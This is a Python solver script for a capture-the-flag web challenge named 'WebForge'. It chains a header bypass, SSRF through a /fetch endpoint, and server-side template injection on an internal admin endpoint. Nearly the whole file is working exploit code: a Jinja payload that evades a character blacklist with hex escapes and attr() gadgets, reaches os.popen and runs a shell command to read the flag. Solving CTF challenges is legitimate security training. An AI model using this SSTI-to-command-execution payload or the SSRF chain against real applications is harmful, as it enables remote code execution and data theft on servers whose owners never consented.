#!/usr/bin/env python3
"""
WebForge solver: header fuzzing (allow: true) -> SSRF /fetch -> SSTI on the
internal /admin endpoint, bypassing the '.' and '_' blacklist with \\xNN hex
escapes and |attr() gadget walking to reach os.popen and read the flag.

Usage: python3 solve.py [base_url]
  base_url defaults to http://127.0.0.1:25303 (archive localhost port).
  On the live site use https://webforge.ctf.hackucf.org

Note: the app is served by gunicorn on internal port 8000, so the SSRF target
is http://127.0.0.1:8000/admin (the original writeup references port 3000,
which was the app.run() dev port).
"""
import os, sys, re, urllib.parse, requests

base = os.environ.get("URL") or (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:25303")

ssti = ("{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')"
        "|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')"
        "|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')"
        "|attr('popen')('cat flag\\x2etxt')|attr('read')()}}")

inner = "http://127.0.0.1:8000/admin?template=" + urllib.parse.quote(ssti)
r = requests.post(base + "/fetch", headers={"allow": "true"}, data={"url": inner})
m = re.search(r"sun\{[^}]*\}", r.text)
print(m.group(0) if m else "NO FLAG FOUND\n" + r.text)
